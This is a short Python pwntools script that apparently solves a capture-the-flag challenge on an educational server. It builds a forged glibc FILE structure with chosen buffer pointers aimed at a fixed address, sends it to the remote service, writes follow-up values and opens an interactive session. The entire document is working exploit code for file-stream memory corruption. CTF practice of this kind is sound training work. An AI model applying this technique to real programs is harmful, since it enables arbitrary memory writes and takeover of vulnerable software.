from pwn import *

# r = process('./chal')
r = remote('edu-ctf.zoolab.org', 10009)

context.arch = 'amd64'

owo_addr = 0x404070

raw_input()
payload = flat(
    p64(0)*2,
    0, 0x1e1,
    p64(0xfbad0000),        #_flags         O
    p64(0),                 #_IO_read_ptr   O
    p64(0),                 #_IO_read_end   O
    p64(0),                 #_IO_read_base  X
    p64(owo_addr),          #_IO_write_base O
    p64(0),                 #_IO_write_ptr  X
    p64(0),                 #_IO_write_end  X
    p64(owo_addr),          #_IO_buf_base   O
    p64(owo_addr+0x20),      #_IO_buf_end    O
    p64(0)*5,               #_chain         X
    p64(0)                  #_fileno        O
)

r.send(payload)
raw_input()
r.sendline(p64(2)*2)

r.interactive()